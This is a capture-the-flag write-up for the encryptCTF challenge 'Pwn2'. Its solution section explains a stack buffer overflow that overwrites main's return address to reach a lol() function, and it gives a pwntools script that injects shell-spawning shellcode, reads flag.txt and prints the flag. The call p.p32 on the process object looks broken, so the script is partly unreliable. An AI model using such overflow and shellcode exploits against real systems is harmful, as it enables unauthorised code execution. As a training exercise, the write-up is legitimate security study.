# Pwn2
### 📄 Description
I made a simple shell which allows me to run some specific commands on my server can you test it for bugs?

### ⚙ How to run it
```bash
./pwn2
```

### ⛔ Rules
Don't open the `flag.txt` file.

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>

What we can do to retrieve the flag is overflowing the buffer `buffer`, overwriting `main()` return address to be `lol()` function entrypoint. We'll also need to provide shellcode where lol stack base will be.

```python
from pwn import *

context.binary = "./pwn2"

p = process()

p.send(b"A" * 44)
p.p32(context.binary.functions["lol"].address + 3)
p.sendline(asm(shellcraft.sh()))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

<h3> 🚩 Flag </h3>

```plain
encryptCTF{N!c3_j0b_jump3R}
```
</details>